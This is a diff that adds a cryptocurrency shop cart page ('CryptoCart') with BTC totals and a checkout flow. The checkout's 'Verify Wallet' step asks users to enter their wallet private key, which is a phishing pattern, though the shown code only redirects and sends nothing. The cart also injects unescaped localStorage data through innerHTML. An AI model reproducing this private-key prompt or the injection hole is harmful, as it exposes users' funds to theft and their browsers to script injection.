@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Cart - Your Cart</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+body { font-family: calibri, Arial, sans-serif; }
+        body {
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            width: 80%;
+            margin: auto;
+            padding: 20px;
+        }
+        .cart-header, .cart-item, .cart-footer {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px;
+            background-color: #f8f8f8;
+            border: 1px solid #ddd;
+            margin-bottom: 10px;
+            align-items: center;
+        }
+        .cart-item img {
+            width: 100px;
+            height: auto;
+        }
+        .cart-footer {
+            align-items: center;
+        }
+        .cart-footer .total {
+            font-size: 20px;
+        }
+        .btn-delete {
+            color: blue;
+            cursor: pointer;
+        }
+        .btn-checkout, .btn-payment {
+            padding: 10px 20px;
+            background-color: #ff6347;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+        }
+        .checkbox {
+            margin-right: 10px;
+        }
+        .payment-method {
+            display: none;
+            margin-top: 20px;
+        }
+        .wallet-verification {
+            display: none;
+            margin-top: 20px;
+        }
+        .wallet-verification input {
+            padding: 10px;
+            margin-right: 10px;
+        }
+        .btn-verify {
+            padding: 10px 20px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-sm bg-dark navbar-dark">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="home.html">CryptoCart</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="collapsibleNavbar">
+                <ul class="navbar-nav">
+                    <li class="nav-item">
+                        <a class="nav-link" href="home.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="products.html">Products</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="cart.html">Cart</a>
+                    </li>
+                </ul>
+                <ul class="navbar-nav ml-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="payment.html">Payment</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <h1>Your Cart</h1>
+        <div class="cart-header">
+            <span>Select</span>
+            <span>Product</span>
+            <span>Unit Price</span>
+            <span>Quantity</span>
+            <span>Total Price</span>
+            <span>Actions</span>
+        </div>
+        <div class="cart-item" id="cartItem1">
+            <input type="checkbox" class="checkbox" onchange="updateSubtotal()" id="checkbox1">
+            <span>
+                <img src="images/razermouse.jpg" alt="Razer Mouse">
+                <p>Razer Mouse with 2 year warranty</p>
+            </span>
+            <span>$60 - $80 (0.00064 BTC - 0.00085 BTC)</span>
+            <span>1</span>
+            <span>$60.00 (0.00064 BTC)</span>
+            <span class="btn-delete" onclick="removeItem('cartItem1')">DELETE</span>
+        </div>
+        <div class="cart-footer">
+            <input type="checkbox" class="checkbox" onchange="selectAll(this)" id="selectAll">
+            <span>Select All</span>
+            <span class="total">Total: 0.00000 BTC</span>
+            <button class="btn-checkout" onclick="showPaymentMethod()">CHECKOUT</button>
+        </div>
+        <div class="payment-method" id="paymentMethod">
+            <h2>Choose Payment Method</h2>
+            <button class="btn-payment" onclick="showWalletVerification()">CRYPTOWALLET</button>
+        </div>
+        <div class="wallet-verification" id="walletVerification">
+            <h2>Verify Wallet</h2>
+            <input type="text" id="privateKey" placeholder="Enter Private Key">
+            <button class="btn-verify" onclick="verifyWallet()">VERIFY WALLET ADDRESS</button>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS and dependencies -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script>
+        function removeItem(itemId) {
+            var item = document.getElementById(itemId);
+            if (item) {
+                item.parentNode.removeChild(item);
+                updateSubtotal();
+            }
+        }
+
+        function selectAll(selectAllCheckbox) {
+            var checkboxes = document.querySelectorAll('.cart-item .checkbox');
+            checkboxes.forEach(function(checkbox) {
+                checkbox.checked = selectAllCheckbox.checked;
+            });
+            updateSubtotal();
+        }
+
+        function updateSubtotal() {
+            var checkboxes = document.querySelectorAll('.cart-item .checkbox');
+            var totalBTC = 0;
+            checkboxes.forEach(function(checkbox) {
+                if (checkbox.checked) {
+                    var cartItem = checkbox.parentNode;
+                    var btcText = cartItem.querySelector('span:nth-child(5)').innerText;
+                    var btc = parseFloat(btcText.match(/\((.*?) BTC\)/)[1]);
+                    totalBTC += btc;
+                }
+            });
+            document.querySelector('.total').innerText = `Total: ${totalBTC.toFixed(5)} BTC`;
+        }
+
+        function showPaymentMethod() {
+            document.getElementById('paymentMethod').style.display = 'block';
+            document.getElementById('walletVerification').style.display = 'none';
+        }
+
+        function showWalletVerification() {
+            document.getElementById('walletVerification').style.display = 'block';
+        }
+
+        function verifyWallet() {
+            var privateKey = document.getElementById('privateKey').value;
+            if (privateKey === "") {
+                alert("Please enter your wallet's private key");
+            } else {
+                alert("Wallet Verified! Proceeding to payment.");
+                window.location.href = 'walletverification.html';
+            }
+        }
+
+        // Initialize the cart items from localStorage
+        function initializeCart() {
+            var cart = JSON.parse(localStorage.getItem('cart')) || [];
+            var cartContainer = document.querySelector('.container');
+            cart.forEach(function(item, index) {
+                var cartItem = document.createElement('div');
+                cartItem.classList.add('cart-item');
+                cartItem.id = 'cartItem' + (index + 1);
+                cartItem.innerHTML = `
+                    <input type="checkbox" class="checkbox" onchange="updateSubtotal()" id="checkbox${index + 1}">
+                    <span>
+                        <img src="${item.image}" alt="${item.name}">
+                        <p>${item.name}</p>
+                    </span>
+                    <span>${item.price}</span>
+                    <span>${item.quantity}</span>
+                    <span>${(parseFloat(item.price.replace('$', '').split(' ')[0]) * item.quantity).toFixed(2)} (0.000${(parseFloat(item.price.match(/\((.*?) BTC\)/)[1]) * item.quantity).toFixed(5)} BTC)</span>
+                    <span class="btn-delete" onclick="removeItem('cartItem${index + 1}')">DELETE</span>
+                `;
+                cartContainer.insertBefore(cartItem, cartContainer.querySelector('.cart-footer'));
+            });
+            updateSubtotal();
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeCart();
+        });
+    </script>
+</body>
+</html>
